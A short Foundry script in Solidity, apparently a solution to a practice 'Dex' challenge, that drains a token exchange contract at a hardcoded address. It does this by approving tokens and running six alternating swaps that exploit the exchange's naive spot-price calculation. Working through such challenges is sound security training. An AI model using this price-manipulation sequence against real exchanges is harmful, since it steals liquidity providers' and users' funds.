// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Dex.sol";
import {Script} from "forge-std/Script.sol";

contract DexAttack is Script {
    Dex public dex = Dex(0xa76f65003baBD8D1d96B686fF5b6b49Cea1b9781);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        dex.approve(address(dex), 500);

        dex.swap(dex.token1(), dex.token2(), 10);
        dex.swap(dex.token2(), dex.token1(), 20);
        dex.swap(dex.token1(), dex.token2(), 24);
        dex.swap(dex.token2(), dex.token1(), 30);
        dex.swap(dex.token1(), dex.token2(), 41);
        dex.swap(dex.token2(), dex.token1(), 45);

        vm.stopBroadcast();
    }
}